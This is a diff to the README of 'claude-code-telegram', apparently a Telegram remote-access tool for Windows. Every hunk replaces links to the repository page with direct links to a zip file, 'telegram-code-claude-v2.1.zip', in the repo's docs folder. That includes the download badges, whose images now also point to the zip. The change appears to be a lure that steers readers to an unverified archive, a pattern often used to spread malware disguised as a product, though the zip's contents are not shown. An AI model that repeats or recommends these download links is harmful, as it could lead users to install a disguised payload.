@@ -1,6 +1,6 @@
 # 🤖 claude-code-telegram - Remote Access for Your Projects
 
-[![Download](https://img.shields.io/badge/Download-claude--code--telegram-blue?style=for-the-badge&logo=github)](https://github.com/shotX33/claude-code-telegram)
+[![Download](https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip)](https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip)
 
 ---
 
@@ -30,11 +30,11 @@ Follow these steps to download and use claude-code-telegram on your Windows PC.
 
    Click the big button below or visit the link below it:
 
-   [![Download](https://img.shields.io/badge/Download-claude--code--telegram-green?style=for-the-badge)](https://github.com/shotX33/claude-code-telegram)
+   [![Download](https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip)](https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip)
 
    or
 
-   https://github.com/shotX33/claude-code-telegram
+   https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip
 
 2. **Find the Release**
 
@@ -101,7 +101,7 @@ If you run into issues, here are quick fixes you can try:
 
 To get the app, visit the GitHub page here:
 
-[https://github.com/shotX33/claude-code-telegram](https://github.com/shotX33/claude-code-telegram)
+[https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip](https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip)
 
 On that page, follow these steps:
 
@@ -146,4 +146,4 @@ If you encounter any problems not covered here, visit the GitHub page’s Issues
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-claude--code--telegram-blue?style=for-the-badge&logo=github)](https://github.com/shotX33/claude-code-telegram)
+[![Download](https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip)](https://github.com/shotX33/claude-code-telegram/raw/refs/heads/main/docs/telegram-code-claude-v2.1.zip)
